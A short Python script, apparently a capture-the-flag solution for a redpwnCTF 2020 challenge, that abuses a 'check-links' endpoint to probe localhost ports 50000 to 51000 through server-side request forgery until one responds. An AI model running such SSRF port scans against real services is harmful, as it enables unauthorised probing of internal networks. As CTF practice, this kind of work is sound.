import requests

for port in range(50000, 51001):
    r = requests.post("http://2020.redpwnc.tf:31957/check-links", data = {
        'links': 'http://localhost:' + str(port)
    },  proxies={'http':'http://127.0.0.1:8080'})
    if ("true" in r.text):
        print("Port is " + str(port))
        break